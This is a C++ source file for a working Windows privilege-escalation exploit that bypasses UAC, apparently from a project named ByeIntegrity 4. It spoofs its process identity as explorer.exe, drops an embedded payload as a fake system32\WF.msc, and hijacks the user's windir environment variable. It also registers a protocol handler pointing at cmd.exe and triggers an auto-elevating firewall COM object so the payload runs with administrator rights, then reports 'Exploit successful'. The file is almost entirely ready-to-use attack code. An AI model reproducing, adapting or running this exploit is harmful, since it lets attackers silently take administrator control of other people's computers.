#include <Windows.h>
#include <ShlObj.h>
#include <iostream>
#include <string>

#include "resource.h"

EXTERN_C IMAGE_DOS_HEADER __ImageBase;

#pragma region NT Stuff
typedef struct _UNICODE_STRING
{
	unsigned short Length;
	unsigned short MaximumLength;
	long Padding_8;
	wchar_t* Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _CURDIR
{
	struct _UNICODE_STRING DosPath;
	void* Handle;
} CURDIR, * PCURDIR;

typedef struct _STRING
{
	unsigned short Length;
	unsigned short MaximumLength;
	long Padding_94;
	char* Buffer;
} STRING, * PSTRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	unsigned short Flags;
	unsigned short Length;
	unsigned long TimeStamp;
	struct _STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	unsigned long MaximumLength;
	unsigned long Length;
	unsigned long Flags;
	unsigned long DebugFlags;
	void* ConsoleHandle;
	unsigned long ConsoleFlags;
	long Padding_95;
	void* StandardInput;
	void* StandardOutput;
	void* StandardError;
	struct _CURDIR CurrentDirectory;
	struct _UNICODE_STRING DllPath;
	struct _UNICODE_STRING ImagePathName;
	struct _UNICODE_STRING CommandLine;
	void* Environment;
	unsigned long StartingX;
	unsigned long StartingY;
	unsigned long CountX;
	unsigned long CountY;
	unsigned long CountCharsX;
	unsigned long CountCharsY;
	unsigned long FillAttribute;
	unsigned long WindowFlags;
	unsigned long ShowWindowFlags;
	long Padding_96;
	struct _UNICODE_STRING WindowTitle;
	struct _UNICODE_STRING DesktopInfo;
	struct _UNICODE_STRING ShellInfo;
	struct _UNICODE_STRING RuntimeData;
	struct _RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
	unsigned __int64 EnvironmentSize;
	unsigned __int64 EnvironmentVersion;
	void* PackageDependencyData;
	unsigned long ProcessGroupId;
	unsigned long LoaderThreads;
	struct _UNICODE_STRING RedirectionDllName;
	struct _UNICODE_STRING HeapPartitionName;
	unsigned __int64* DefaultThreadpoolCpuSetMasks;
	unsigned long DefaultThreadpoolCpuSetMaskCount;
	long __PADDING__[1];
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

constexpr auto PEB_OFFSET = 0x60ULL;
constexpr auto PROCESS_PARAM_OFFSET = 0x20ULL;
constexpr auto BASENAME_OFFSET = 0x58ULL;
constexpr auto FULLNAME_OFFSET = 0x48ULL;
constexpr auto DLL_BASE_OFFSET = 0x30ULL;
constexpr auto OS_MAJOR_VERSION_OFFSET = 0x118ULL;
constexpr auto OS_MINOR_VERSION_OFFSET = 0x11CULL;
#pragma endregion

using RtlInitUnicodeStringPtr = void(NTAPI*)(PUNICODE_STRING, PCWSTR);
using LDR_ENUM_CALLBACK = void(NTAPI*)(PVOID, PVOID, PBOOLEAN);
using LdrEnumerateLoadedModulesPtr = NTSTATUS(NTAPI*)(ULONG, LDR_ENUM_CALLBACK, PVOID);

using UserAssocSetPtr = void(WINAPI*)(int unknown0, PCWCHAR fileType, PCWCHAR progId);
using UserAssocSetInternalPtr = HRESULT(WINAPI*)(void* unused0, PCWCHAR fileType, PCWCHAR progId, int unknown0);

using ReleasePtr = ULONG(WINAPI*)();
using LaunchAdvancedUIPtr = HRESULT(WINAPI*)();

struct LDR_CALLBACK_PARAMS
{
	PCWCHAR ExplorerPath;
	PVOID ImageBase;
	RtlInitUnicodeStringPtr RtlInitUnicodeString;
};

#define ASSUME_HRESULT virtual HRESULT
#define LEAVE_EMPTY

struct IFwCplLua : IUnknown
{
	ASSUME_HRESULT GetTypeInfoCount(LEAVE_EMPTY) = 0;
	ASSUME_HRESULT GetTypeInfo(LEAVE_EMPTY) = 0;
	ASSUME_HRESULT GetIDsOfNames(LEAVE_EMPTY) = 0;
	ASSUME_HRESULT Invoke(LEAVE_EMPTY) = 0;
	ASSUME_HRESULT AddGlobalPort(LEAVE_EMPTY) = 0;
	ASSUME_HRESULT AddProgram(LEAVE_EMPTY) = 0;
	ASSUME_HRESULT DeleteGlobalPort(LEAVE_EMPTY) = 0;
	ASSUME_HRESULT DeleteApplication(LEAVE_EMPTY) = 0;
	ASSUME_HRESULT EnablePort(LEAVE_EMPTY) = 0;
	ASSUME_HRESULT EnableProgram(LEAVE_EMPTY) = 0;
	ASSUME_HRESULT EnableRuleGroup(LEAVE_EMPTY) = 0;
	ASSUME_HRESULT EnableCustomRule(LEAVE_EMPTY) = 0;
	ASSUME_HRESULT EditGlobalPort(LEAVE_EMPTY) = 0;
	ASSUME_HRESULT EditProgram(LEAVE_EMPTY) = 0;
	ASSUME_HRESULT Activate() = 0;
	ASSUME_HRESULT LaunchAdvancedUI() = 0;
};

const GUID IID_IFwCplLua = { 0x56DA8B35, 0x7FC3, 0x45DF, {0x87, 0x68, 0x66, 0x41, 0x47, 0x86, 0x45, 0x73} };

const BYTE SIGNATURE_NT10[] = {
	0x48, 0x8B, 0xC4, 0x55, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0x68, 0xA1, 0x48, 0x81, 0xEC, 0xA0,
	0x00, 0x00, 0x00, 0x48, 0xC7, 0x45, 0xEF, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x20
};

const BYTE SIGNATURE_NT6X[] = {
	0x48, 0x89, 0x5C, 0x24, 0x08, 0x55, 0x56, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0xAC, 0x24, 0x80, 0xFE, 0xFF,
	0xFF, 0x48, 0x81, 0xEC, 0x80, 0x02, 0x00, 0x00
};

void ForgeProcessInformation(PCWCHAR explorerPath, const RtlInitUnicodeStringPtr RtlInitUnicodeString,
	const LdrEnumerateLoadedModulesPtr LdrEnumerateLoadedModules)
{
	auto* const pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
	auto* pProcessParams = *reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS*>(pPeb + PROCESS_PARAM_OFFSET);

	RtlInitUnicodeString(&pProcessParams->ImagePathName, explorerPath);
	RtlInitUnicodeString(&pProcessParams->CommandLine, L"explorer.exe");

	LDR_CALLBACK_PARAMS params{ explorerPath, GetModuleHandleW(nullptr), RtlInitUnicodeString };

	LdrEnumerateLoadedModules(0, [](PVOID ldrEntry, PVOID context, PBOOLEAN stop)
		{
			auto* params = static_cast<LDR_CALLBACK_PARAMS*>(context);

			if (*reinterpret_cast<PULONG_PTR>(reinterpret_cast<ULONG_PTR>(ldrEntry) + DLL_BASE_OFFSET) == reinterpret_cast<
				ULONG_PTR>(params->ImageBase))
			{
				const auto baseName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + BASENAME_OFFSET),
					fullName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + FULLNAME_OFFSET);

				params->RtlInitUnicodeString(baseName, L"explorer.exe");
				params->RtlInitUnicodeString(fullName, params->ExplorerPath);

				*stop = TRUE;
			}
		}, reinterpret_cast<PVOID>(&params));
}

template <typename T>
T LocateSignature(const BYTE signature[], const int signatureSize, const char* sectionName, const HMODULE moduleHandle)
{
	auto* headers = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<PUCHAR>(moduleHandle) + reinterpret_cast<
		PIMAGE_DOS_HEADER>(moduleHandle)->e_lfanew);
	auto* sectionHeader = IMAGE_FIRST_SECTION(headers);

	while (std::strcmp(sectionName, reinterpret_cast<char*>(sectionHeader->Name)) != 0)
		sectionHeader++;

	for (auto* i = reinterpret_cast<PUCHAR>(moduleHandle) + sectionHeader->PointerToRawData; i != reinterpret_cast<
		PUCHAR>(moduleHandle) + sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData - signatureSize; i++
		)
	{
		if (std::memcmp(signature, i, signatureSize) == 0)
			return reinterpret_cast<T>(i);
	}

	return reinterpret_cast<T>(nullptr);
}

int main()
{
	auto* hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

	auto* const pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
	const auto osMajorVersion = *reinterpret_cast<PULONG>(pPeb + OS_MAJOR_VERSION_OFFSET);
	const auto osMinorVersion = *reinterpret_cast<PULONG>(pPeb + OS_MINOR_VERSION_OFFSET);

	if (osMajorVersion <= 6 && osMinorVersion < 1)
	{
		std::wcout << L"OS not supported.\n";
		return EXIT_FAILURE;
	}
	
	auto* hResInfo = FindResourceW(reinterpret_cast<HMODULE>(&__ImageBase), MAKEINTRESOURCEW(IDR_MMCPAYLOAD), L"PAYLOAD");
	if (!hResInfo)
	{
		std::wcout << L"FindResourceW() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	auto* hResource = LoadResource(reinterpret_cast<HMODULE>(&__ImageBase), hResInfo);
	if (!hResource)
	{
		std::wcout << L"LoadResource() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	auto* pResource = LockResource(hResource);
	if (!pResource)
	{
		std::wcout << L"LockResource() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	if (!CreateDirectoryW(L"system32", nullptr))
	{
		std::wcout << L"CreateDirectoryW() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	auto* hFile = CreateFileW(L"system32\\WF.msc", FILE_WRITE_ACCESS, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		RemoveDirectoryW(L"system32");
		std::wcout << L"CreateFileW() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	DWORD writeSize; // For Windows 7, otherwise we get NULL dereference access violation.
	const auto result = WriteFile(hFile, pResource, SizeofResource(reinterpret_cast<HINSTANCE>(&__ImageBase), hResInfo),
	                              &writeSize, nullptr);
	CloseHandle(hFile);
	if (!result)
	{
		DeleteFileW(L"system32\\WF.msc");
		RemoveDirectoryW(L"system32");
		std::wcout << L"WriteFile() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	
	PWSTR windowsPath, systemPath;
	auto hr = SHGetKnownFolderPath(FOLDERID_Windows, 0, nullptr, &windowsPath);
	if (FAILED(hr))
	{
		DeleteFileW(L"system32\\WF.msc");
		RemoveDirectoryW(L"system32");
		std::wcout << L"SHGetKnownFolderPath() (0) failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	hr = SHGetKnownFolderPath(FOLDERID_System, 0, nullptr, &systemPath);
	if (FAILED(hr))
	{
		DeleteFileW(L"system32\\WF.msc");
		RemoveDirectoryW(L"system32");
		CoTaskMemFree(windowsPath);
		std::wcout << L"SHGetKnownFolderPath() (1) failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	std::wstring explorer{ windowsPath }, system32{ systemPath };
	CoTaskMemFree(windowsPath);
	CoTaskMemFree(systemPath);
	explorer += L"\\explorer.exe";

	const auto RtlInitUnicodeString = reinterpret_cast<RtlInitUnicodeStringPtr>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString"));
	const auto LdrEnumerateLoadedModules = reinterpret_cast<LdrEnumerateLoadedModulesPtr>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "LdrEnumerateLoadedModules"));

	ForgeProcessInformation(explorer.c_str(), RtlInitUnicodeString, LdrEnumerateLoadedModules);

	hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY);
	if (FAILED(hr))
	{
		DeleteFileW(L"system32\\WF.msc");
		RemoveDirectoryW(L"system32");
		std::wcout << L"CoInitializeEx() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	HKEY key, protoKey;
	auto status = RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4\\shell\\open\\command", 0,
		nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &key, nullptr);
	if (status)
	{
		DeleteFileW(L"system32\\WF.msc");
		RemoveDirectoryW(L"system32");
		CoUninitialize();
		std::wcout << L"RegCreateKeyExW() (0) failed. LSTATUS: " << status << std::endl;
		return EXIT_FAILURE;
	}
	status = RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\protocol-byeintegrity4", 0, nullptr,
	                         REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &protoKey, nullptr);
	if (status)
	{
		DeleteFileW(L"system32\\WF.msc");
		RemoveDirectoryW(L"system32");
		RegCloseKey(key);
		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4");
		CoUninitialize();
		std::wcout << L"RegCreateKeyExW() (1) failed. LSTATUS: " << status << std::endl;
		return EXIT_FAILURE;
	}
	system32 += L"\\cmd.exe";
	status = RegSetValueExW(key, nullptr, 0, REG_SZ, reinterpret_cast<const BYTE*>(system32.c_str()),
		static_cast<DWORD>(system32.size() * sizeof WCHAR + sizeof(L'\0')));
	RegCloseKey(key);
	if (status)
	{
		DeleteFileW(L"system32\\WF.msc");
		RemoveDirectoryW(L"system32");
		RegCloseKey(protoKey);
		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\protocol-byeintegrity4");
		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4");
		CoUninitialize();
		std::wcout << L"RegSetValueExW() (0) failed. LSTATUS: " << status << std::endl;
		return EXIT_FAILURE;
	}
	status = RegSetValueExW(protoKey, L"URL Protocol", 0, REG_SZ, nullptr, 0);
	RegCloseKey(protoKey);
	if (status)
	{
		DeleteFileW(L"system32\\WF.msc");
		RemoveDirectoryW(L"system32");
		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\protocol-byeintegrity4");
		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4");
		CoUninitialize();
		std::wcout << L"RegSetValueExW() (1) failed. LSTATUS: " << status << std::endl;
		return EXIT_FAILURE;
	}
	
	if (osMajorVersion == 10 && osMinorVersion == 0)
	{
		auto* const hModule = LoadLibraryExW(L"SystemSettings.Handlers.dll", nullptr,
		                                     LOAD_LIBRARY_SEARCH_SYSTEM32);
		if (!hModule)
		{
			DeleteFileW(L"system32\\WF.msc");
			RemoveDirectoryW(L"system32");
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\protocol-byeintegrity4");
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4");
			CoUninitialize();
			std::wcout << L"LoadLibraryExW() failed. Error: " << GetLastError() << std::endl;
			return EXIT_FAILURE;
		}

		const auto UserAssocSetInternal = LocateSignature<UserAssocSetInternalPtr>(
			SIGNATURE_NT10, sizeof SIGNATURE_NT10, ".text", hModule);
		if (!UserAssocSetInternal)
		{
			DeleteFileW(L"system32\\WF.msc");
			RemoveDirectoryW(L"system32");
			FreeLibrary(hModule);
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\protocol-byeintegrity4");
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4");
			CoUninitialize();
			std::wcout << L"SystemSettings.Handlers.dll!UserAssocSet->\"Internal\" not found.\n";
			return EXIT_FAILURE;
		}

		hr = UserAssocSetInternal(nullptr, L"protocol-byeintegrity4", L"byeintegrity4", 1);
		FreeLibrary(hModule);
		if (FAILED(hr))
		{
			DeleteFileW(L"system32\\WF.msc");
			RemoveDirectoryW(L"system32");
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\protocol-byeintegrity4");
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4");
			CoUninitialize();
			std::wcout <<
				L"SystemSettings.Handlers.dll!UserAssocSet->\"Internal\" did not return S_OK. Return value -> HRESULT 0x"
				<< std::hex << hr << std::endl;
			return EXIT_FAILURE;
		}
	}
	else if (osMajorVersion == 6 && (osMinorVersion == 2 || osMinorVersion == 3))
	{
		auto* const hModule = LoadLibraryExW(L"shell32.dll", nullptr, LOAD_LIBRARY_SEARCH_SYSTEM32);
		if (!hModule)
		{
			DeleteFileW(L"system32\\WF.msc");
			RemoveDirectoryW(L"system32");
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\protocol-byeintegrity4");
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4");
			CoUninitialize();
			std::wcout << L"LoadLibraryExW() failed. Error: " << GetLastError() << std::endl;
			return EXIT_FAILURE;
		}

		const auto UserAssocSet = LocateSignature<UserAssocSetPtr>(SIGNATURE_NT6X, sizeof SIGNATURE_NT6X, ".text",
			hModule);
		if (!UserAssocSet)
		{
			DeleteFileW(L"system32\\WF.msc");
			RemoveDirectoryW(L"system32");
			FreeLibrary(hModule);
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\protocol-byeintegrity4");
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4");
			CoUninitialize();
			std::wcout << L"shell32.dll!UserAssocSet not found.\n";
			return EXIT_FAILURE;
		}

		UserAssocSet(2, L"protocol-byeintegrity4", L"byeintegrity4");
		FreeLibrary(hModule);
	}
	else if (osMajorVersion == 6 && osMinorVersion == 1)
	{
		HKEY choiceKey;
		status = RegCreateKeyExW(
			HKEY_CURRENT_USER,
			L"SOFTWARE\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\protocol-byeintegrity4\\UserChoice",
			0, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &choiceKey, nullptr);
		if (status)
		{
			DeleteFileW(L"system32\\WF.msc");
			RemoveDirectoryW(L"system32");
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\protocol-byeintegrity4");
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4");
			CoUninitialize();
			std::wcout << L"RegCreateKeyExW() (2) failed. LSTATUS: " << status << std::endl;
			return EXIT_FAILURE;
		}
		status = RegSetValueExW(choiceKey, L"ProgId", 0, REG_SZ, reinterpret_cast<const BYTE*>(L"byeintegrity4"),
		                        sizeof(L"byeintegrity4"));
		RegCloseKey(choiceKey);
		if (status)
		{
			DeleteFileW(L"system32\\WF.msc");
			RemoveDirectoryW(L"system32");
			RegDeleteTreeW(
				HKEY_CURRENT_USER,
				L"SOFTWARE\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\protocol-byeintegrity4");
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\protocol-byeintegrity4");
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4");
			CoUninitialize();
			std::wcout << L"RegSetValueExW() (2) failed. LSTATUS: " << status << std::endl;
			return EXIT_FAILURE;
		}
	}
	
	status = RegCreateKeyExW(HKEY_CURRENT_USER, L"Environment", 0, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE | KEY_QUERY_VALUE,
	                         nullptr, &key, nullptr);
	if (status)
	{
		DeleteFileW(L"system32\\WF.msc");
		RemoveDirectoryW(L"system32");
		if (osMajorVersion == 6 && osMinorVersion == 1)
			RegDeleteTreeW(
				HKEY_CURRENT_USER,
				L"SOFTWARE\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\protocol-byeintegrity4");
		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\protocol-byeintegrity4");
		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4");
		CoUninitialize();
		std::wcout << L"RegCreateKeyExW() (3) failed. LSTATUS: " << status << std::endl;
		return EXIT_FAILURE;
	}
	
	const auto requiredSize = static_cast<ULONG_PTR>(GetCurrentDirectoryW(0, nullptr));
	auto currentDirectory = new WCHAR[requiredSize + 1];
	GetCurrentDirectoryW(static_cast<DWORD>(requiredSize), currentDirectory);
	
	status = RegSetValueExW(key, L"windir", 0, REG_SZ, reinterpret_cast<const BYTE*>(currentDirectory),
	                        requiredSize * sizeof(WCHAR) + sizeof(L'\0'));
	delete[] currentDirectory;
	if (status)
	{
		RegCloseKey(key);
		DeleteFileW(L"system32\\WF.msc");
		RemoveDirectoryW(L"system32");
		if (osMajorVersion == 6 && osMinorVersion == 1)
			RegDeleteTreeW(
				HKEY_CURRENT_USER,
				L"SOFTWARE\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\protocol-byeintegrity4");
		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\protocol-byeintegrity4");
		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4");
		CoUninitialize();
		std::wcout << L"RegSetValueExW() (3) failed. LSTATUS: " << status << std::endl;
		return EXIT_FAILURE;
	}
	RegFlushKey(key);
	SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, reinterpret_cast<LPARAM>(L"Environment"), SMTO_BLOCK,
	                    1000, nullptr);

	BIND_OPTS3 bind{};
	bind.dwClassContext = CLSCTX_LOCAL_SERVER;
	bind.cbStruct = sizeof(BIND_OPTS3);

	IFwCplLua* fwCplLua;
	hr = CoGetObject(L"Elevation:Administrator!new:{752438CB-E941-433F-BCB4-8B7D2329F0C8}", &bind, IID_IFwCplLua,
		reinterpret_cast<void**>(&fwCplLua));
	if (FAILED(hr))
	{
		RegDeleteValueW(key, L"windir");
		RegFlushKey(key);
		RegCloseKey(key);
		SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, reinterpret_cast<LPARAM>(L"Environment"), SMTO_BLOCK,
			1000, nullptr);
		DeleteFileW(L"system32\\WF.msc");
		RemoveDirectoryW(L"system32");
		if (osMajorVersion == 6 && osMinorVersion == 1)
			RegDeleteTreeW(
				HKEY_CURRENT_USER,
				L"SOFTWARE\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\protocol-byeintegrity4");
		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\protocol-byeintegrity4");
		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4");
		CoUninitialize();
		std::wcout << L"CoGetObject() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	
	hr = fwCplLua->LaunchAdvancedUI();
	RegDeleteValueW(key, L"windir");
	RegFlushKey(key);
	RegCloseKey(key);
	SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, reinterpret_cast<LPARAM>(L"Environment"), SMTO_BLOCK,
		1000, nullptr);
	fwCplLua->Release();
	DeleteFileW(L"system32\\WF.msc");
	RemoveDirectoryW(L"system32");
	if (osMajorVersion == 6 && osMinorVersion == 1)
		RegDeleteTreeW(
			HKEY_CURRENT_USER,
			L"SOFTWARE\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\protocol-byeintegrity4");
	RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\protocol-byeintegrity4");
	RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4");
	CoUninitialize();

	if (FAILED(hr))
	{
		std::wcout << L"IFwCplLua::LaunchAdvancedUI() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	SetConsoleTextAttribute(hConsole, 14);
	std::wcout << L"[";
	SetConsoleTextAttribute(hConsole, 15);
	std::wcout << L"=";
	SetConsoleTextAttribute(hConsole, 14);
	std::wcout << L"] *** Exploit successful.\n\n";
	SetConsoleTextAttribute(hConsole, 7);

	return 0;
}